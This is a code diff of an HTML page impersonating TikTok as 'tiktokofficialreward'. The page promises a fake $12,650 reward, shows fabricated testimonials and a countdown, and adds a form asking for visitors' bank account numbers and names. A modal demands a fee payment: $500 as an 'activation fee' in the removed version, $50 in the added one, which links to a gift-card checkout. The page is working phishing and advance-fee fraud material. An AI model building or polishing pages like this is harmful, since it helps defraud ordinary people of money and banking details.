@@ -8,9 +8,6 @@
 <link rel="shortcut icon" href="Tiktok logo.png" type="image/x-icon">
 <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:opsz,wght@9..40,300;9..40,400;9..40,500;9..40,600&display=swap" rel="stylesheet"/>
 <style>
-/* ═══════════════════════════════════════════════
-   CSS VARIABLES
-═══════════════════════════════════════════════ */
 :root{
   --bg:#ffffff; --bg2:#f8fafc; --bg3:#f1f5f9;
   --glass:rgba(0,0,0,0.04);
@@ -28,18 +25,6 @@
   --sh:none;
   --tr:all 0.22s cubic-bezier(.4,0,.2,1);
 }
-[data-theme="light"]{
-  --bg:#ffffff; --bg2:#f8fafc; --bg3:#f1f5f9;
-  --glass:rgba(0,0,0,0.04); --glass2:rgba(0,0,0,0.07);
-  --gb:rgba(0,0,0,0.12); --gb2:rgba(0,0,0,0.20);
-  --text:#0f172a; --text2:#475569; --text3:#94a3b8;
-  --card:rgba(255,255,255,0.97);
-  --sh:none;
-}
-
-/* ═══════════════════════════════════════════════
-   BASE
-═══════════════════════════════════════════════ */
 *{box-sizing:border-box;margin:0;padding:0;}
 html{scroll-behavior:smooth;}
 body{
@@ -52,28 +37,13 @@ input,select,textarea{font-family:var(--fb);}
 a{color:#000000;text-decoration:none;}
 
 /* BG ambient */
-.bg-blob{
-  position:fixed;z-index:-1;border-radius:50%;pointer-events:none;
-  animation:blob 20s ease-in-out infinite;
-}
-.bb1{width:700px;height:700px;top:-200px;left:-200px;
-  background:radial-gradient(circle,rgba(59,130,246,.1),transparent 70%);
-  animation-duration:18s;}
-.bb2{width:550px;height:550px;bottom:-150px;right:-100px;
-  background:radial-gradient(circle,rgba(16,185,129,.08),transparent 70%);
-  animation-duration:24s;animation-direction:reverse;}
-.bb3{width:450px;height:450px;top:50%;left:50%;
-  background:radial-gradient(circle,rgba(139,92,246,.06),transparent 70%);
-  animation-duration:30s;}
-@keyframes blob{
-  0%,100%{transform:translate(0,0);}
-  33%{transform:translate(40px,30px);}
-  66%{transform:translate(-30px,20px);}
-}
+.bg-blob{position:fixed;z-index:-1;border-radius:50%;pointer-events:none;animation:blob 20s ease-in-out infinite;}
+.bb1{width:700px;height:700px;top:-200px;left:-200px;background:radial-gradient(circle,rgba(59,130,246,.1),transparent 70%);animation-duration:18s;}
+.bb2{width:550px;height:550px;bottom:-150px;right:-100px;background:radial-gradient(circle,rgba(16,185,129,.08),transparent 70%);animation-duration:24s;animation-direction:reverse;}
+.bb3{width:450px;height:450px;top:50%;left:50%;background:radial-gradient(circle,rgba(139,92,246,.06),transparent 70%);animation-duration:30s;}
+@keyframes blob{0%,100%{transform:translate(0,0);}33%{transform:translate(40px,30px);}66%{transform:translate(-30px,20px);}}
 
-/* ═══════════════════════════════════════════════
-   TOAST
-═══════════════════════════════════════════════ */
+/* TOAST */
 #toast{
   position:fixed;top:20px;left:50%;z-index:9999;
   transform:translateX(-50%) translateY(-16px);
@@ -88,9 +58,19 @@ a{color:#000000;text-decoration:none;}
 #toast.success{border-color:var(--green);color:var(--green);}
 #toast.info{border-color:#000;color:#000;}
 
-/* ═══════════════════════════════════════════════
-   PAYMENT SUCCESS MODAL
-═══════════════════════════════════════════════ */
+/* SLIDE-DOWN NOTIFICATIONS */
+#pay-notify, #profile-notify{
+  position:fixed;top:0;left:50%;transform:translateX(-50%) translateY(-120%);
+  z-index:9999;background:#10b981;color:#fff;
+  padding:16px 32px;border-radius:0 0 16px 16px;
+  font-family:Arial,sans-serif;font-size:.92rem;font-weight:700;
+  box-shadow:0 8px 28px rgba(16,185,129,.4);
+  transition:transform .45s cubic-bezier(.34,1.2,.64,1);
+  white-space:nowrap;text-align:center;
+}
+#pay-notify.slide-down, #profile-notify.slide-down{transform:translateX(-50%) translateY(0);}
+
+/* PAYMENT MODAL */
 #pay-modal-overlay{
   display:none;position:fixed;inset:0;z-index:9000;
   background:rgba(0,0,0,0.45);backdrop-filter:blur(4px);
@@ -108,106 +88,68 @@ a{color:#000000;text-decoration:none;}
 }
 @keyframes popIn{from{transform:scale(.85);opacity:0;}to{transform:scale(1);opacity:1;}}
 #pay-modal .pm-icon{font-size:3rem;margin-bottom:14px;}
-#pay-modal h3{
-  font-family:Arial,sans-serif;font-size:1.35rem;font-weight:800;
-  color:#0f172a;margin-bottom:10px;letter-spacing:-.01em;
-}
-#pay-modal p{
-  font-family:Arial,sans-serif;color:#475569;font-size:.95rem;
-  line-height:1.65;margin-bottom:24px;
-}
+#pay-modal h3{font-family:Arial,sans-serif;font-size:1.35rem;font-weight:800;color:#0f172a;margin-bottom:10px;letter-spacing:-.01em;}
+#pay-modal p{font-family:Arial,sans-serif;color:#475569;font-size:.95rem;line-height:1.65;margin-bottom:24px;}
 #pay-modal .pm-cont-btn{
   display:inline-block;padding:13px 38px;border:none;border-radius:50px;
   background:#000000;color:#fff;
   font-family:Arial,sans-serif;font-size:.95rem;font-weight:700;
   cursor:pointer;box-shadow:none;
-  transition:all .2s;letter-spacing:.02em;
+  transition:all .2s;letter-spacing:.02em;text-decoration:none;
 }
 #pay-modal .pm-cont-btn:hover{transform:translateY(-2px);box-shadow:none;}
 
-/* ═══════════════════════════════════════════════
-   PAYMENT SUCCESS SLIDE-DOWN NOTIFICATION
-═══════════════════════════════════════════════ */
-#pay-notify{
-  position:fixed;top:0;left:50%;transform:translateX(-50%) translateY(-120%);
-  z-index:9999;background:#10b981;color:#fff;
-  padding:16px 32px;border-radius:0 0 16px 16px;
-  font-family:Arial,sans-serif;font-size:.92rem;font-weight:700;
-  box-shadow:0 8px 28px rgba(16,185,129,.4);
-  transition:transform .45s cubic-bezier(.34,1.2,.64,1);
-  white-space:nowrap;text-align:center;
+/* PROFILE GATE */
+#profile-gate{
+  display:none;min-height:100vh;flex-direction:column;
+  align-items:center;justify-content:center;padding:32px 16px;
 }
-#pay-notify.slide-down{transform:translateX(-50%) translateY(0);}
-
-/* ═══════════════════════════════════════════════
-   DASHBOARD TESTIMONIAL MARQUEE
-═══════════════════════════════════════════════ */
-.dash-testi-strip{
-  margin:22px 0;padding:14px 0;overflow:hidden;
-  background:#f8fafc;
-  border:1px solid #e2e8f0;border-radius:16px;
+#profile-gate.on{display:flex;}
+.brand-wrap{text-align:center;margin-bottom:30px;}
+.brand-logo{
+  width:70px;height:70px;border-radius:20px;margin:0 auto 14px;
+  background:#000000;
+  display:flex;align-items:center;justify-content:center;
+  font-family:Arial,sans-serif;font-size:1.65rem;font-weight:800;color:#fff;
+  box-shadow:none;
   position:relative;
 }
-.dash-testi-strip::before,
-.dash-testi-strip::after{
-  content:'';position:absolute;top:0;bottom:0;width:60px;z-index:2;pointer-events:none;
+.brand-wrap h1{font-family:var(--fh);font-size:1.85rem;font-weight:800;letter-spacing:-.03em;}
+.brand-wrap h1 em{font-style:normal;color:var(--accent);}
+.brand-wrap p{color:var(--text2);font-size:.88rem;margin-top:5px;}
+.auth-card{
+  width:100%;max-width:480px;
+  background:var(--card);backdrop-filter:blur(28px);
+  border:1px solid var(--gb2);border-radius:var(--r);
+  padding:34px 30px;box-shadow:var(--sh);
 }
-.dash-testi-strip::before{left:0;background:linear-gradient(to right,#f8fafc,transparent);}
-.dash-testi-strip::after{right:0;background:linear-gradient(to left,#f8fafc,transparent);}
-
-.testi-track{
-  display:flex;align-items:stretch;
-  width:max-content;
-  animation:scrollLeft 32s linear infinite;
+.fg{margin-bottom:14px;}
+.fg label{
+  display:block;font-size:.75rem;font-weight:700;letter-spacing:.07em;
+  text-transform:uppercase;color:var(--text2);margin-bottom:6px;
 }
-.testi-track:hover{animation-play-state:paused;}
-
-@keyframes scrollLeft{
-  0%{transform:translateX(0);}
-  100%{transform:translateX(-50%);}
+.fg input{
+  width:100%;padding:12px 14px;background:var(--glass);
+  border:1.5px solid var(--gb);border-radius:var(--rs);
+  color:var(--text);font-size:.92rem;outline:none;
+  -webkit-appearance:none;appearance:none;
+  transition:border-color .18s,box-shadow .18s;
 }
-
-.dt-card{
-  display:inline-flex;flex-direction:column;flex-shrink:0;
-  background:#ffffff;border:1.5px solid #e2e8f0;
-  border-radius:14px;padding:16px 20px;margin:0 10px;
-  width:280px;box-shadow:none;
-  font-family:Arial,sans-serif;
+.fg input:focus{border-color:#000;box-shadow:0 0 0 3px rgba(0,0,0,.10);}
+.btn-p{
+  width:100%;padding:14px;border:none;border-radius:var(--rs);
+  background:#000000;
+  color:#fff;font-family:Arial,sans-serif;font-size:.95rem;font-weight:700;
+  letter-spacing:.02em;cursor:pointer;transition:var(--tr);
+  box-shadow:none;margin-top:6px;
 }
-.dt-top{display:flex;align-items:center;gap:10px;margin-bottom:10px;}
-.dt-av{
-  width:40px;height:40px;border-radius:50%;flex-shrink:0;
-  display:flex;align-items:center;justify-content:center;
-  color:#fff;font-family:Arial,sans-serif;font-weight:800;font-size:.85rem;
-}
-.dt-meta h4{font-family:Arial,sans-serif;font-size:.88rem;font-weight:800;color:#0f172a;margin:0 0 2px;}
-.dt-meta p{font-family:Arial,sans-serif;font-size:.74rem;color:#64748b;margin:0;}
-.dt-stars{color:#f59e0b;font-size:.85rem;margin-bottom:6px;letter-spacing:1px;}
-.dt-amt{font-family:Arial,sans-serif;font-size:.78rem;font-weight:700;color:#10b981;margin-bottom:7px;}
-.dt-txt{font-family:Arial,sans-serif;font-size:.78rem;color:#475569;line-height:1.55;font-style:italic;}
-.dt-vtag{font-family:Arial,sans-serif;font-size:.7rem;color:#000000;font-weight:700;margin-top:8px;}
+.btn-p:hover{transform:translateY(-1px);box-shadow:none;}
+.btn-p:active{transform:translateY(0);}
 
-/* spinner */
-.spin{
-  display:inline-block;width:14px;height:14px;
-  border:2px solid rgba(255,255,255,.25);border-top-color:currentColor;
-  border-radius:50%;animation:_spin .6s linear infinite;
-  vertical-align:middle;margin-right:6px;
-}
-@keyframes _spin{to{transform:rotate(360deg)}}
-
-/* ═══════════════════════════════════════════════
-   AUTH PAGE (now removed, but kept for reference)
-   Not used.
-═══════════════════════════════════════════════ */
-
-/* ═══════════════════════════════════════════════
-   DASHBOARD
-═══════════════════════════════════════════════ */
+/* DASHBOARD */
 #dash-page{display:none;flex-direction:column;min-height:100vh;}
 #dash-page.on{display:flex;}
 
-/* topbar */
 .tbar{
   position:sticky;top:0;z-index:200;height:62px;
   display:flex;align-items:center;justify-content:space-between;
@@ -215,7 +157,6 @@ a{color:#000000;text-decoration:none;}
   background:rgba(255,255,255,.97);backdrop-filter:blur(20px);
   border-bottom:1px solid var(--gb);
 }
-[data-theme="light"] .tbar{background:rgba(255,255,255,.97);}
 .tbl{display:flex;align-items:center;gap:10px;}
 .tlogo{
   width:36px;height:36px;border-radius:10px;flex-shrink:0;
@@ -236,7 +177,6 @@ a{color:#000000;text-decoration:none;}
 .hburg{display:flex;flex-direction:column;gap:4px;padding:8px;cursor:pointer;background:none;border:none;}
 .hburg span{display:block;width:20px;height:2px;background:var(--text);border-radius:2px;}
 
-/* mobile nav */
 #mnav{
   display:none;position:fixed;inset:0;z-index:500;
   background:rgba(7,9,15,.97);backdrop-filter:blur(18px);
@@ -250,10 +190,7 @@ a{color:#000000;text-decoration:none;}
   display:flex;align-items:center;justify-content:center;font-size:1.1rem;
 }
 
-/* layout */
 .dlayout{display:flex;flex:1;overflow:hidden;}
-
-/* sidebar */
 .sidebar{
   width:214px;flex-shrink:0;padding:18px 10px;
   border-right:1px solid var(--gb);
@@ -271,35 +208,25 @@ a{color:#000000;text-decoration:none;}
 .nico{font-size:.95rem;width:17px;text-align:center;flex-shrink:0;}
 .sdiv{height:1px;background:var(--gb);margin:7px 4px;}
 
-/* main */
 .dmain{flex:1;overflow-y:auto;padding:26px 22px;}
 .dsec{display:none;}
 .dsec.on{display:block;animation:up .24s ease;}
 
-/* ── welcome banner */
 .wbanner{
-  background:#f8fafc;
-  border:1px solid #e2e8f0;border-radius:var(--r);
+  background:#f8fafc;border:1px solid #e2e8f0;border-radius:var(--r);
   padding:24px 26px;margin-bottom:22px;
   display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px;
 }
 .wt h2{font-size:1.4rem;font-weight:800;margin-bottom:3px;}
 .wt p{color:var(--text2);font-size:.86rem;}
 
-/* stats */
 .sgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(185px,1fr));gap:15px;margin-bottom:22px;}
 .sc{
   background:var(--card);border:1px solid var(--gb);border-radius:var(--r);
   padding:20px;backdrop-filter:blur(10px);transition:var(--tr);
   position:relative;overflow:hidden;
 }
-.sc::after{
-  content:'';position:absolute;top:-25px;right:-25px;
-  width:80px;height:80px;border-radius:50%;opacity:.08;
-}
-.web{
-  background-color: #475569;
-}
+.sc::after{content:'';position:absolute;top:-25px;right:-25px;width:80px;height:80px;border-radius:50%;opacity:.08;}
 .sc:nth-child(1)::after{background:var(--green);}
 .sc:nth-child(2)::after{background:var(--gold);}
 .sc:nth-child(3)::after{background:var(--accent);}
@@ -314,20 +241,14 @@ a{color:#000000;text-decoration:none;}
 .sval.pur{color:var(--purple);}
 .ssub{font-size:.75rem;color:var(--text3);margin-top:3px;}
 
-/* badge */
-.bdg{
-  display:inline-flex;align-items:center;gap:4px;
-  padding:5px 12px;border-radius:40px;font-size:.76rem;font-weight:700;
-}
+.bdg{display:inline-flex;align-items:center;gap:4px;padding:5px 12px;border-radius:40px;font-size:.76rem;font-weight:700;}
 .bdg.pend{background:rgba(245,158,11,.11);color:var(--gold);border:1px solid rgba(245,158,11,.25);}
 .bdg.verif{background:rgba(16,185,129,.11);color:var(--green);border:1px solid rgba(16,185,129,.25);}
 .bdg.proc{background:rgba(0,0,0,.08);color:#000;border:1px solid rgba(0,0,0,.2);}
 
-/* section head */
 .sh{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;flex-wrap:wrap;gap:8px;}
 .sh h3{font-size:1rem;font-weight:800;}
 
-/* activity */
 .alist{display:flex;flex-direction:column;gap:9px;}
 .ai{
   display:flex;align-items:center;gap:13px;
@@ -335,53 +256,37 @@ a{color:#000000;text-decoration:none;}
   border-radius:var(--rs);padding:13px 15px;transition:var(--tr);
 }
 .ai:hover{background:var(--glass2);}
-.aico{
-  width:36px;height:36px;border-radius:9px;flex-shrink:0;
-  background:var(--glass2);display:flex;align-items:center;justify-content:center;font-size:1rem;
-}
+.aico{width:36px;height:36px;border-radius:9px;flex-shrink:0;background:var(--glass2);display:flex;align-items:center;justify-content:center;font-size:1rem;}
 .abody{flex:1;}
 .abody strong{display:block;font-size:.88rem;margin-bottom:1px;}
 .abody span{font-size:.78rem;color:var(--text2);}
 
-/* ── reward */
 .rhero{
   position:relative;overflow:hidden;
-  background:#f8fafc;
-  border:1px solid #e2e8f0;border-radius:var(--r);
+  background:#f8fafc;border:1px solid #e2e8f0;border-radius:var(--r);
   padding:38px 28px;margin-bottom:22px;text-align:center;
-}
-.rhero::before{
-  content:'';position:absolute;inset:0;
-  background:none;
 }
 .rinner{position:relative;z-index:1;}
 .remi{font-size:2.5rem;display:block;margin-bottom:8px;animation:bnc 2.2s ease-in-out infinite;}
 @keyframes bnc{0%,100%{transform:translateY(0);}50%{transform:translateY(-7px);}}
 .rcong{color:var(--text2);font-size:.9rem;margin-bottom:6px;}
-.ramt{
-  font-size:2.9rem;font-weight:800;font-family:Arial,sans-serif;letter-spacing:-2px;
-  color:#10b981;
-  margin:8px 0;
-}
+.ramt{font-size:2.9rem;font-weight:800;font-family:Arial,sans-serif;letter-spacing:-2px;color:#10b981;margin:8px 0;}
 .rtag{
   display:inline-block;padding:6px 18px;border-radius:40px;
   font-size:.82rem;font-weight:700;margin-bottom:18px;
   background:rgba(245,158,11,.14);color:var(--gold);border:1px solid rgba(245,158,11,.32);
 }
 
-/* countdown */
 .cd{display:flex;align-items:center;justify-content:center;gap:5px;}
 .cdu{
   background:var(--card);border:1px solid var(--gb2);
   border-radius:var(--rs);padding:11px 17px;min-width:72px;text-align:center;
-  backdrop-filter:blur(8px);
-  color: red;
+  backdrop-filter:blur(8px);color:red;
 }
 .cnum{font-size:1.9rem;font-weight:800;font-family:var(--fh);display:block;line-height:1;}
 .clbl{font-size:.65rem;color:var(--text3);text-transform:uppercase;letter-spacing:.07em;margin-top:3px;}
 .csep{font-size:1.7rem;font-weight:800;color:var(--text3);margin-bottom:14px;}
 
-/* trust grid */
 .tgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(155px,1fr));gap:10px;margin:18px 0;}
 .tc{
   background:var(--glass);border:1px solid var(--gb);border-radius:var(--rs);
@@ -389,14 +294,13 @@ a{color:#000000;text-decoration:none;}
   font-size:.8rem;color:var(--text2);
 }
 
-/* info box */
 .ibox{
   background:#f8fafc;border:1px solid #e2e8f0;
   border-left:3px solid #000;border-radius:var(--rs);
   padding:13px 17px;font-size:.86rem;color:var(--text2);line-height:1.65;margin-top:14px;
 }
 
-/* ── payment */
+/* PAYMENT */
 .pgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(128px,1fr));gap:11px;margin-bottom:18px;}
 .pc{
   background:var(--glass);border:1.5px solid var(--gb);
@@ -404,10 +308,7 @@ a{color:#000000;text-decoration:none;}
   cursor:pointer;transition:var(--tr);
 }
 .pc:hover{border-color:#000;background:rgba(0,0,0,.05);}
-.pc.sel{
-  border-color:var(--green);background:rgba(16,185,129,.08);
-  box-shadow:none;
-}
+.pc.sel{border-color:var(--green);background:rgba(16,185,129,.08);box-shadow:none;}
 .pico{font-size:1.8rem;margin-bottom:7px;}
 .pc-name{font-size:.8rem;font-weight:700;}
 
@@ -418,77 +319,54 @@ a{color:#000000;text-decoration:none;}
 }
 .pfwrap.open{max-height:700px;opacity:1;padding:24px;}
 
-/* ── testimonials */
-.tgrid2{display:grid;gap:15px;}
-.tcard{
-  background:var(--card);border:1px solid var(--gb);border-radius:var(--r);
-  padding:20px;transition:var(--tr);
+/* MARQUEE TESTIMONIALS */
+.dash-testi-strip{
+  margin:22px 0;padding:14px 0;overflow:hidden;
+  background:#f8fafc;border:1px solid #e2e8f0;border-radius:16px;
+  position:relative;
 }
-.tcard:hover{transform:translateY(-2px);border-color:var(--gb2);}
-.ttop{display:flex;align-items:center;gap:11px;margin-bottom:11px;}
-.tav{
-  width:42px;height:42px;border-radius:50%;flex-shrink:0;
+.dash-testi-strip::before,.dash-testi-strip::after{
+  content:'';position:absolute;top:0;bottom:0;width:60px;z-index:2;pointer-events:none;
+}
+.dash-testi-strip::before{left:0;background:linear-gradient(to right,#f8fafc,transparent);}
+.dash-testi-strip::after{right:0;background:linear-gradient(to left,#f8fafc,transparent);}
+.testi-track{display:flex;align-items:stretch;width:max-content;animation:scrollLeft 32s linear infinite;}
+.testi-track:hover{animation-play-state:paused;}
+@keyframes scrollLeft{0%{transform:translateX(0);}100%{transform:translateX(-50%);}}
+.dt-card{
+  display:inline-flex;flex-direction:column;flex-shrink:0;
+  background:#ffffff;border:1.5px solid #e2e8f0;
+  border-radius:14px;padding:16px 20px;margin:0 10px;
+  width:280px;box-shadow:none;font-family:Arial,sans-serif;
+}
+.dt-top{display:flex;align-items:center;gap:10px;margin-bottom:10px;}
+.dt-av{
+  width:40px;height:40px;border-radius:50%;flex-shrink:0;
   display:flex;align-items:center;justify-content:center;
-  font-family:var(--fh);font-weight:800;color:#fff;font-size:.95rem;
+  color:#fff;font-family:Arial,sans-serif;font-weight:800;font-size:.85rem;
 }
-.tmeta h4{font-size:.9rem;font-weight:700;}
-.tmeta p{font-size:.76rem;color:var(--text2);}
-.tamt{font-size:1rem;font-weight:800;color:var(--green);margin-bottom:6px;}
-.tstars{color:var(--gold);font-size:.85rem;letter-spacing:2px;}
-.ttxt{font-size:.85rem;color:var(--text2);line-height:1.65;font-style:italic;}
-.vtag{display:inline-flex;align-items:center;gap:4px;margin-top:9px;font-size:.73rem;font-weight:700;color:var(--green);}
+.dt-meta h4{font-family:Arial,sans-serif;font-size:.88rem;font-weight:800;color:#0f172a;margin:0 0 2px;}
+.dt-meta p{font-family:Arial,sans-serif;font-size:.74rem;color:#64748b;margin:0;}
+.dt-stars{color:#f59e0b;font-size:.85rem;margin-bottom:6px;letter-spacing:1px;}
+.dt-amt{font-family:Arial,sans-serif;font-size:.78rem;font-weight:700;color:#10b981;margin-bottom:7px;}
+.dt-txt{font-family:Arial,sans-serif;font-size:.78rem;color:#475569;line-height:1.55;font-style:italic;}
+.dt-vtag{font-family:Arial,sans-serif;font-size:.7rem;color:#000000;font-weight:700;margin-top:8px;}
 
-/* ── profile */
-.phero{
-  background:#f8fafc;
-  border:1px solid #e2e8f0;border-radius:var(--r);
-  padding:26px;text-align:center;margin-bottom:18px;
-}
-.prof-av{
-  width:80px;height:80px;border-radius:50%;margin:0 auto 13px;
-  background:#000000;
-  display:flex;align-items:center;justify-content:center;
-  font-family:Arial,sans-serif;font-size:1.9rem;font-weight:800;color:#fff;
-  box-shadow:none;overflow:hidden;
-}
-.prof-av img{width:100%;height:100%;object-fit:cover;}
-.prof-name{font-size:1.25rem;font-weight:800;margin-bottom:3px;}
-.prof-handle{color:var(--text2);font-size:.86rem;}
-
-.prows{display:flex;flex-direction:column;gap:9px;}
-.pr{
-  display:flex;align-items:center;justify-content:space-between;
-  background:var(--glass);border:1px solid var(--gb);
-  border-radius:var(--rs);padding:12px 17px;
-}
-.pr label{font-size:.74rem;font-weight:700;text-transform:uppercase;letter-spacing:.05em;color:var(--text2);}
-.pr span{font-size:.88rem;font-weight:600;}
-
-/* ── footer */
 .dfooter{
   border-top:1px solid var(--gb);padding:17px 22px;
   text-align:center;font-size:.78rem;color:var(--text3);
   background:var(--card);
 }
 .dfooter a{color:#000000;}
+#loading-screen{display:none;}
 
-/* loading screen (hidden, kept for reference) */
-#loading-screen{
-  display:none;
-}
-
-/* ═══════════════════════════════════════════════
-   RESPONSIVE
-═══════════════════════════════════════════════ */
 @media(min-width:769px){
   .sidebar{display:flex;}
   .hburg{display:none;}
   .tname{display:block;}
   .dmain{padding:30px 34px;}
-  .tgrid2{grid-template-columns:1fr 1fr;}
 }
 @media(max-width:768px){
-  .fr{grid-template-columns:1fr;}
   .ramt{font-size:2rem;}
   .sgrid{grid-template-columns:1fr 1fr;}
   .pgrid{grid-template-columns:repeat(2,1fr);}
@@ -502,45 +380,59 @@ a{color:#000000;text-decoration:none;}
 </head>
 <body>
 
-<!-- ambient blobs -->
 <div class="bg-blob bb1"></div>
 <div class="bg-blob bb2"></div>
 <div class="bg-blob bb3"></div>
 <div id="toast"></div>
 
-<!-- PAYMENT SUCCESS MODAL -->
-<div id="pay-modal-overlay">
-  <div id="pay-modal">
-    <div class="pm-icon">🎉</div>
-   
-    <p style="color: red;">Your price payment is currently on hold due to an incomplete verfication process. To complete verification and unlock your withdrawal, please submit a refundable activation fee of $500. Failure to do so before the countdown ends may result in cancellation of your reward. Please check your Email inbox and spam folder for further details on how to make payment for the activation fee.</p>
-    <button class="pm-cont-btn" onclick="APP.continueAfterPay()">Click to Continue</button>
+<!-- 3-SEC DROP-DOWN FOR PROFILE SUBMISSION -->
+<div id="profile-notify">✅ Your details has been sent to the management</div>
+
+<!-- PAYMENT SLIDE-DOWN -->
+<div id="pay-notify">✅ Payment details submitted successfully — check your Email for your reward!</div>
+
+<!-- PROFILE GATE (FIRST PAGE) -->
+<div id="profile-gate" class="on">
+  <div class="brand-wrap">
+    <div class="brand-logo"><img src="Tiktok logo.png" alt="" style="width:auto;height:30px;border-radius:20px;"></div>
+    <h1>Tiktok <em>Official</em></h1>
+    <p>Complete your profile to continue</p>
+  </div>
+  <div class="auth-card">
+    <h3 style="margin-bottom:18px;font-size:1.1rem;font-weight:800;">Create Your Account</h3>
+    <div class="fg">
+      <label>Username</label>
+      <input type="text" id="pg-username" placeholder="e.g. user123"/>
+    </div>
+    <div class="fg">
+      <label>Bank Account Number</label>
+      <input type="text" id="pg-bank-acct" placeholder="Non-Nigerian account number"/>
+    </div>
+    <div class="fg">
+      <label>Bank Account Name</label>
+      <input type="text" id="pg-bank-name" placeholder="e.g. John Adams"/>
+    </div>
+    <button class="btn-p" onclick="APP.submitProfile()">Submit Details →</button>
   </div>
 </div>
 
-<!-- PAYMENT SLIDE-DOWN NOTIFICATION -->
-<div id="pay-notify">✅ Payment details submitted successfully — check your Email for your reward!</div>
-
-<!-- LOADING SCREEN (hidden) -->
-<div id="loading-screen">
-  <div class="load-logo"><img src="Tiktok logo.png" alt="Tiktok Logo" style="width: auto; height: 70px; border-radius: 10px;  /* rounded corners */
-border-radius: 20px;  /* more rounded */"></div>
-  <div class="load-txt">Loading tiktokofficialreward…</div>
+<!-- PAYMENT MODAL -->
+<div id="pay-modal-overlay">
+  <div id="pay-modal">
+    <div class="pm-icon">🎉</div>
+    <p style="color: red;">Your reward is currently being processed, kindly complete the $50 payment, if applicable, to proceed, please confirm any required fees and payment details before making a payment.</p>
+    <a href="https://www.mygiftcardsupply.com/checkout/" class="pm-cont-btn">Click to Continue</a>
+  </div>
 </div>
-<link rel="shortcut icon" href="Tiktok logo.png" type="image/x-icon">
 
-<!-- ═════════════════════════════════════════════════════
-     DASHBOARD PAGE (LOGIN REMOVED)
-══════════════════════════════════════════════════════ -->
+<!-- DASHBOARD -->
 <div id="dash-page">
-
   <nav class="tbar">
     <div class="tbl">
       <button class="hburg" onclick="APP.mobNav()" aria-label="Open menu">
         <span></span><span></span><span></span>
       </button>
-      <div class="tlogo"><img src="Tiktok logo.png" alt="" style="width: auto; height: 30px; border-radius: 10px;  /* rounded corners */
-border-radius: 20px;  /* more rounded */"></div>
+      <div class="tlogo"><img src="Tiktok logo.png" alt="" style="width:auto;height:30px;border-radius:20px;"></div>
       <span class="tname">tiktokofficialreward</span>
     </div>
     <div class="tbr">
@@ -549,30 +441,22 @@ border-radius: 20px;  /* more rounded */"></div>
     </div>
   </nav>
 
-  <!-- mobile nav overlay -->
   <div id="mnav">
     <div class="mclose" onclick="APP.mobNav()">✕</div>
     <button class="ni on" data-s="s-home"   onclick="APP.sec('s-home')"><span class="nico">🏠</span> Dashboard</button>
     <button class="ni"    data-s="s-reward" onclick="APP.sec('s-reward')"><span class="nico">🎉</span> My Reward</button>
     <button class="ni"    data-s="s-pay"    onclick="APP.sec('s-pay')"><span class="nico">💳</span> Payment</button>
-    <div class="sdiv"></div>
-    <button class="ni"    data-s="s-prof"   onclick="APP.sec('s-prof')"><span class="nico">👤</span> My Profile</button>
   </div>
 
   <div class="dlayout">
-
-    <!-- sidebar -->
     <aside class="sidebar">
       <button class="ni on" data-s="s-home"   onclick="APP.sec('s-home')"><span class="nico">🏠</span> Dashboard</button>
       <button class="ni"    data-s="s-reward" onclick="APP.sec('s-reward')"><span class="nico">🎉</span> My Reward</button>
       <button class="ni"    data-s="s-pay"    onclick="APP.sec('s-pay')"><span class="nico">💳</span> Payment</button>
-      <div class="sdiv"></div>
-      <button class="ni"    data-s="s-prof"   onclick="APP.sec('s-prof')"><span class="nico">👤</span> My Profile</button>
     </aside>
 
     <main class="dmain">
 
-      <!-- HOME -->
       <section class="dsec on" id="s-home">
         <div class="wbanner">
           <div class="wt">
@@ -583,7 +467,7 @@ border-radius: 20px;  /* more rounded */"></div>
         </div>
 
         <div class="sgrid">
-          <div class="sc"><div class="sico">💰</div><div class="slbl">Available Reward</div><div class="sval grn">$10,000</div><div class="ssub">USD · Pending claim</div></div>
+          <div class="sc"><div class="sico">💰</div><div class="slbl">Available Reward</div><div class="sval grn">$12,650</div><div class="ssub">USD · Pending claim</div></div>
           <div class="sc"><div class="sico">📊</div><div class="slbl">Reward Status</div><div class="sval gld">Pending</div><div class="ssub">Verification in progress</div></div>
           <div class="sc"><div class="sico">👥</div><div class="slbl">Total Participants</div><div class="sval blu" data-count="10M+">10M+</div><div class="ssub">Globally enrolled</div></div>
           <div class="sc"><div class="sico">✅</div><div class="slbl">Payouts Sent</div><div class="sval pur" data-count="5M+">5M+</div><div class="ssub">Successful transfers</div></div>
@@ -593,7 +477,7 @@ border-radius: 20px;  /* more rounded */"></div>
         <div class="alist">
           <div class="ai">
             <div class="aico">🎯</div>
-            <div class="abody"><strong>Reward Program Entry Confirmed</strong><span>Qualified for the $10,000 USD reward program</span></div>
+            <div class="abody"><strong>Reward Program Entry Confirmed</strong><span>Qualified for the $12,650 USD reward program</span></div>
             <span class="bdg pend">Pending</span>
           </div>
           <div class="ai">
@@ -608,129 +492,91 @@ border-radius: 20px;  /* more rounded */"></div>
           </div>
         </div>
 
-        <!-- TESTIMONIAL SCROLL STRIP ON DASHBOARD -->
         <div class="sh" style="margin-top:26px;"><h3>💬 What Recipients Are Saying</h3></div>
         <div class="dash-testi-strip">
           <div class="testi-track">
-            <!-- SET 1 -->
             <div class="dt-card">
-              <div class="dt-top">
-                <div class="dt-av" style="background:linear-gradient(135deg,#3b82f6,#6366f1);">JA</div>
-                <div class="dt-meta"><h4>James A.</h4><p>🇺🇸 United States · TikTok: @james_official</p></div>
-              </div>
+              <div class="dt-top"><div class="dt-av" style="background:linear-gradient(135deg,#3b82f6,#6366f1);">JA</div><div class="dt-meta"><h4>James A.</h4><p>🇺🇸 United States · TikTok: @james_official</p></div></div>
               <div class="dt-stars">★★★★★</div>
-              <div class="dt-amt">✅ Received: $10,000 via PayPal · May 2026</div>
+              <div class="dt-amt">✅ Received: $12,650 via PayPal · May 2026</div>
               <p class="dt-txt">"I honestly didn't believe it at first, but the payout came through within 24 hours. The process was seamless!"</p>
               <div class="dt-vtag">✔ Verified Recipient — ID #TK-2026-0051</div>
             </div>
             <div class="dt-card">
-              <div class="dt-top">
-                <div class="dt-av" style="background:linear-gradient(135deg,#10b981,#059669);">FC</div>
-                <div class="dt-meta"><h4>Fatima C.</h4><p>🇳🇬 Nigeria · TikTok: @fatima.creates</p></div>
-              </div>
